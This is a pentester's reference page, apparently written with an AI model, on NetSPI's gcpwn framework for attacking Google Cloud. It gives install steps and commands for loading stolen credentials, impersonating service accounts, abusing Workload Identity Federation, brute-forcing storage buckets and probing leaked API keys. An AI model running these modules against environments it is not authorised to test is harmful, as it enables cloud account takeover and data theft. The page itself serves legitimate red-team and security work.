# gcpwn

**Tags:** `#gcpwn` `#gcp` `#cloud` `#enumeration` `#privesc` `#postexploitation` `#framework` `#python`

NetSPI's GCP exploitation framework — the GCP counterpart to [[Tools/Cloud/Pacu|Pacu]] (AWS)
and [[Tools/Cloud/MicroBurst|MicroBurst]]/[[Tools/Cloud/PowerZure|PowerZure]] (Azure). A
module-driven, session-based tool: load stolen GCP credentials into a workspace, then run
enumeration, privilege-escalation, unauthenticated, and attack-path modules, with everything
tracked in a local SQLite DB. Fills the "GCP has no framework" gap that used to leave you
hand-rolling `gcloud` one-liners.

**Source:** https://github.com/NetSPI/gcpwn
**Install:**
```bash
git clone https://github.com/NetSPI/gcpwn && cd gcpwn
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python -m gcpwn            # (or `gcpwn` if pip-installed, or the release binary)
```

> [!note] Module names below are representative — gcpwn evolves fast. Run **`modules list`** /
> **`modules search <kw>`** inside the REPL for the authoritative current set before relying on a name.

---

## Workspaces & Credentials

gcpwn stores everything in a **workspace** (SQLite `databases/gcpwn.db`); credentials live inside it.

```
# On launch, create/select a workspace, then load a credential:
#   - a user or service-account (SA) key,
#   - an OAuth / access token,
#   - or an ADC/gcloud session (gcloud config set project <PROJECT_ID> first).
# List/switch creds and workspaces from the REPL.
```

---

## Running Modules

Modules are grouped by intent: **enum** (recon), **exploit** (privesc workflows),
**unauth** (no-creds API/bucket probing), **process** (analysis), and **opengraph**
(BloodHound-style attack-path graphing).

```
# Enumeration
modules run enum_gcp --iam --download            # project assets + IAM, pull artifacts
modules run enum_all --parallel-services 3       # sweep every reachable service
modules run enum_google_workspace --impersonate admin@domain.com   # Workspace side

# Exploitation (privilege escalation) — each maps to an abusable permission/path
modules run exploit_generate_access_token --target-sa <SA_EMAIL>   # impersonate an SA (generateAccessToken)
modules run exploit_sign_jwt_as_sa --target-sa <SA_EMAIL>          # signJwt path
modules run exploit_wif_impersonation --mode setup --target-sa <SA_EMAIL>   # Workload Identity Federation abuse

# Unauthenticated (no credentials needed)
modules run unauth_apikey_enum_all_scopes --api-key AIza...        # what a leaked API key can reach
modules run unauth_bucketbrute --keyword acme --check              # GCS bucket brute (see GCPBucketBrute)

# Attack-path analysis (opengraph)
modules run process_og_gcpwn_data --expand-inherited --reset --out output.json
modules run process_og_attack_paths --graph-json output.json --to-role roles/owner
```

---

## Data Export

```
data export csv
data export json
data export excel
data sql --db service "SELECT * FROM iam_allow_policies LIMIT 25"
```

Artifacts land under `gcpwn_output/<workspace>/`; an audit trail is kept in
`gcpwn_output/<workspace>/tool_logs/history_log.txt`.

---

## Passthrough (single module, no REPL)

```bash
gcpwn --module unauth_apikey_enum_all_scopes --api-key AIza...
gcpwn --module enum_iam --workspace <WS> --cred <CRED> --current-project
```

---

> [!note] **See also** — source tokens/keys with [[Tools/Cloud/gcloud-cli|gcloud-cli]]; the deep
> per-permission privesc catalogue is [[Tools/Cloud/GCP-IAM-PrivEsc|GCP-IAM-PrivEsc]] (gcpwn's
> `exploit_*` modules automate much of it); GCS bucket work overlaps [[Tools/Cloud/GCPBucketBrute|GCPBucketBrute]];
> misconfig audit is [[Tools/Cloud/ScoutSuite|ScoutSuite]]. AWS/Azure framework peers: [[Tools/Cloud/Pacu|Pacu]] / [[Tools/Cloud/MicroBurst|MicroBurst]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
